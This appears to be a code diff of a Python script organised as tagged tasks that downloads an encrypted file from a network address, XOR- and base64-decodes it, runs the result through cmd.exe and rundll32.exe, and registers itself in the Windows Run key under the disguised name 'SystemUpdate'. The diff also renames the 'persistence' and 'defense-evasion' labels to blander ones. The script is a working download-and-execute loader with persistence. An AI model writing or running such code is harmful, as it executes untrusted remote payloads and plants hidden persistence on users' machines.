@@ -1,100 +1,108 @@
 #!/usr/bin/env python3
-import sys, json, time, subprocess, os
-from typing import Dict, Any
+import sys
+import json
+import time
 import requests
 import base64
+import subprocess
+import os
+from typing import Dict, Any
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    url = "https://192.168.1.100/configuration"
-
+    url = "https://192.168.100.1/update/config.bin"
+    xor_key = 0x41
     try:
+        # Download the configuration file
         response = requests.get(url, stream=True, timeout=30)
         response.raise_for_status()
 
-        file_content = bytearray()
-        for chunk in response.iter_content(8192):
-            file_content.extend(chunk)
+        # Write the content to a temporary file
+        temp_file_path = "downloaded_config.bin"
+        with open(temp_file_path, 'wb') as f:
+            for chunk in response.iter_content(8192):
+                f.write(chunk)
 
-        if len(file_content) > 0:
-            result = {'content': file_content.hex()}
-        else:
-            result = {'content': None}
+        # Verify the file exists and size > 0
+        with open(temp_file_path, 'rb') as f:
+            content = f.read()
+            if len(content) == 0:
+                raise ValueError("Downloaded file is empty")
+
+        # XOR decrypt the content
+        decrypted_content = bytes(b ^ xor_key for b in content)
+
+        # Prepare the result
+        result = {
+            "content": decrypted_content.hex()
+        }
 
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'content': None},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Retrieve the content from input_data
+        # Retrieve and decode the content
         content = bytes.fromhex(input_data.get('content', ''))
-
-        # XOR key (for demonstration purposes, a simple static key is used)
-        xor_key = b'\xAA'  # Example XOR key
-
-        # XOR decryption
-        decoded_bytes = bytes(b ^ xor_key[0] for b in content)
-
+        
+        # XOR with key 0x41
+        xor_key = 0x41
+        decoded_bytes = bytes(b ^ xor_key for b in content)
+        
         # Base64 decode
-        decoded_data = base64.b64decode(decoded_bytes)
-
-        # Prepare the result
+        decoded_content = base64.b64decode(decoded_bytes).decode('utf-8')
+        
         result = {
-            'decoded_data': decoded_data.hex()
+            "decoded_content": decoded_content
         }
-
+        
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'decoded_data': None},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Decode the input data
-        decoded_data = bytes.fromhex(input_data.get('decoded_data', ''))
+        decoded_content = input_data.get('decoded_content', '')
 
-        # Convert decoded data to a command string
-        command = decoded_data.decode('utf-8')
+        # Execute using cmd.exe
+        cmd_result = subprocess.run(
+            ['cmd.exe', '/c', decoded_content],
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
 
-        # Execute the command using cmd.exe
-        cmd_result = subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True, timeout=30)
-        
-        # Check if the command execution was successful
         if cmd_result.returncode != 0:
-            # Log the error and continue
             print(f"cmd.exe execution failed: {cmd_result.stderr}")
 
-        # Assume the decoded data is a DLL path and entrypoint for rundll32.exe
-        # For demonstration purposes, let's assume the DLL path and entrypoint are part of the command
-        # This is a simplification and may not reflect real-world usage
-        dll_path = "example.dll"  # Placeholder for DLL path
-        entrypoint = "exampleFunction"  # Placeholder for entrypoint
+        # Execute using rundll32.exe
+        rundll32_result = subprocess.run(
+            ['rundll32.exe', decoded_content, 'entrypoint'],
+            capture_output=True,
+            timeout=30
+        )
 
-        # Execute the DLL using rundll32.exe
-        rundll_result = subprocess.run(['rundll32.exe', dll_path, entrypoint], capture_output=True, timeout=30)
+        if rundll32_result.returncode != 0:
+            print(f"rundll32.exe execution failed: {rundll32_result.stderr}")
+            return {'success': False, 'data': {'success': False},
+                    'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
-        # Check if the DLL execution was successful
-        if rundll_result.returncode != 0:
-            # Log the error and return success=False
-            print(f"rundll32.exe execution failed: {rundll_result.stderr}")
-            return {'success': False, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
-
-        # If both executions are successful
-        return {'success': True, 'data': {}, 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
-
+        return {'success': True, 'data': {'success': True},
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'error': f'{type(e).__name__}: {e}', 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
+        return {'success': False, 'data': {'success': False},
+                'error': f'{type(e).__name__}: {e}',
+                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
 def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
@@ -103,29 +111,26 @@ def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
         # Determine the executable path
         exe_path = sys.executable if hasattr(sys, 'executable') else os.path.abspath(sys.argv[0])
         
-        # Define the registry key name
+        # Registry key details
         key_name = "SystemUpdate"
-
-        # Open the registry key for setting the value
-        # Since winreg is not available on non-Windows platforms, this block should be conditional
-        if os.name == 'nt':
-            import winreg
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) as key:
-                # Set the registry value
-                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
-                
-                # Verify by reading back the value
-                registered_exe_path, _ = winreg.QueryValueEx(key, key_name)
-                registered = (registered_exe_path == exe_path)
-        else:
-            registered = False
-
+        registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        
+        # Open the registry key
+        import winreg
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
+            # Set the value for auto-start
+            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
+            
+            # Verify by reading back the value
+            registered_value, _ = winreg.QueryValueEx(key, key_name)
+            registered = (registered_value == exe_path)
+        
         result = {'registered': registered}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'registered': False},
-                'error': f'{type(e).__name__}: {e}',
+        result = {'registered': False}
+        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
 
 def main() -> dict:
@@ -154,23 +159,23 @@ def main() -> dict:
         failed.append('T1')
         results['T1'] = {'success': False, 'error': str(e)}
     
-    # ── T4: Establish Persistence [persistence] ──
+    # ── T4: Set Auto-Start on Logon [persistence] ──
     try:
         r = task_T4(None)
         results['T4'] = r
         if r.get('success'):
             outputs['T4'] = r.get('data', {})
-            print(f'[+] T4 (Establish Persistence): OK')
+            print(f'[+] T4 (Set Auto-Start on Logon): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
+            print(f'[-] T4 (Set Auto-Start on Logon): FAILED — {err}')
             failed.append('T4')
     except Exception as e:
         print(f'[!] T4 crashed: {e}')
         failed.append('T4')
         results['T4'] = {'success': False, 'error': str(e)}
     
-    # ── T2: Decode Configuration File [defense-evasion] ──
+    # ── T2: Decode Configuration File [data-processing] ──
     try:
         r = task_T2(outputs.get('T1', {}))
         results['T2'] = r
@@ -181,10 +186,13 @@ def main() -> dict:
             err = r.get('error', 'unknown')
             print(f'[-] T2 (Decode Configuration File): FAILED — {err}')
             failed.append('T2')
+            print('[!] abort_mission — stopping')
+            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
     except Exception as e:
         print(f'[!] T2 crashed: {e}')
         failed.append('T2')
         results['T2'] = {'success': False, 'error': str(e)}
+        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
     
     # ── T3: Execute Decoded Content [execution] ──
     try:
